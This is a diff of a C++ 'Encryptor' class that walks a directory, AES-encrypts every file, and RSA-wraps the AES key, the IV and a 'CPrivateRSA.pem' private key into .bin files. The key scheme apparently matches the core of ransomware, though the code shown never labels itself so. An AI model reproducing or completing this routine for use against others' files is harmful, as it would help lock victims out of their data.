@@ -22,14 +22,19 @@ Encryptor::~Encryptor()
 
 }
 
-void Encryptor::startWithDir(const std::string &path)
+void Encryptor::invokeDir(const std::string &path)
 {
+    // Encrypt the CPrivateRSA.pem file CPrivateRSA.bin
     encryptCPrivateRSA();
 
+    // Get all files from provided directory path
     auto files =  _dirIterator->getAllFiles(path);
 
+    // Generate the AES Key and IV
     if ( _aesEncryptor->generateAESKey() )
     {
+
+        // If --protect is enabled
         std::string aeskey = _aesEncryptor->getAESKey();
         std::string aesiv = _aesEncryptor->getAESIv();
         butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
@@ -37,46 +42,33 @@ void Encryptor::startWithDir(const std::string &path)
 
         for (auto &file: files)
         {
-
-            //_aesKeyDatabase->insertEntry(filepath, butterfly::string_to_hex(_aesEncryptor->getAESKey()), butterfly::string_to_hex(_aesEncryptor->getAESIv()));
-
+            LOG_TRACE("FILE: " << file);
             encryptFileWithAES(file.string());
         }
-    }
 
-    encryptAESKeyFile("AESKey.txt");
-
-    //encryptFileWithAES(_aesKeyDbFilepath);
-
-    //encryptFinalAESKeyWithRSA(_aesEncryptor->getAESKey(), "AESKey.bin");
-    //encryptFinalAESIVWithRSA(_aesEncryptor->getAESIv(), "AESIV.bin");
-    /*
-    if ( _aesKeyDatabase->close() )
-    {
-        encryptFileWithAES(_aesKeyDbFilepath);
-
+        // Save the final AESKey.bin file
         encryptFinalAESKeyWithRSA(_aesEncryptor->getAESKey(), "AESKey.bin");
-        encryptFinalAESIVWithRSA(_aesEncryptor->getAESIv(), "AESIV.bin");
-    }*/
+        // Save the final AESIV.bin file
+        encryptFinalAESKeyWithRSA(_aesEncryptor->getAESIv(), "AESIV.bin");
+
+    }
 
 }
 
 void Encryptor::encryptCPrivateRSA()
 {
-
+    // Get the CPrivateRSA.pem file string
     std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
-
-    _rsaEncryptorAESIV = std::unique_ptr<rsa::RSAEncryptor>(new rsa::RSAEncryptor(cPrivateRSAStr));
 
     EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();
 
     try
     {
-        // encrypt the CPrivateRSA.pem string
+        // Encrypt the CPrivateRSA.pem file string
         _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr.substr(0, cPrivateRSAStr.size() - 1));
-        // get the encrypted CPrivateRSA string
+        // Get the encrypted CPrivateRSA.pem string
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedKey();
-        // save the encrypted CPrivateRSA string to CPrivateRSA.bin
+        // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
         _rsaEncryptorCPrivateRSA->saveEncryptedKeyFile(CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));
 
     } catch (RSAEncryptionException &e)
@@ -91,6 +83,7 @@ void Encryptor::encryptFileWithAES(const std::string &filepath)
 
     try
     {
+        // Encrypt the file with AES
         _aesEncryptor->encryptFile(filepath);
 
     } catch (AESEncryptionException &e)
@@ -100,39 +93,17 @@ void Encryptor::encryptFileWithAES(const std::string &filepath)
 
 }
 
-void Encryptor::encryptFinalAESKeyWithRSA(const std::string &data, const std::string &filename)
+void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename)
 {
-
-    //std::string fileContent = butterfly::readBinFile(filepath);
 
     try
     {
-        // encrypt the AES Key
-        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), data);
-        // get the encrypted AES Key string
+        // Encrypt the AES Key String
+        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);
+        // Get the encrypted AES Key String
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
-        // save the encrypted AES Key to AESKey.bin
+        // Save the encrypted AES Key to AESKey.bin
         _rsaEncryptorAESKey->saveEncryptedKeyFile(filename, aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());
-
-    } catch (RSAEncryptionException &e)
-    {
-        LOG_ERROR(e.what());
-    }
-
-}
-void Encryptor::encryptFinalAESIVWithRSA(const std::string &data, const std::string &filename)
-{
-
-    //std::string fileContent = butterfly::readBinFile(filepath);
-
-    try
-    {
-        // encrypt the AES IV
-        _rsaEncryptorAESIV->encrypt(_rsaEncryptorAESIV->getEvpPkey(), data);
-        // get the encrypted AES IV string
-        std::string aesKeyEnc = _rsaEncryptorAESIV->getEncryptedKey();
-        // save the encrypted AES IV to AESIV.bin
-        _rsaEncryptorAESIV->saveEncryptedKeyFile(filename, aesKeyEnc,_rsaEncryptorAESIV->getRSAKeySize());
 
     } catch (RSAEncryptionException &e)
     {
@@ -152,7 +123,7 @@ void Encryptor::encryptAESKeyFile(const std::string &filepath)
         // get the encrypted AES Key string
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
         // save the encrypted AES Key to AESKey.bin
-        _rsaEncryptorAESKey->saveEncryptedKeyFile("AESKey.bin", aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());
+        _rsaEncryptorAESKey->saveEncryptedKeyFile(filepath + ".bin", aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());
 
     } catch (RSAEncryptionException &e)
     {
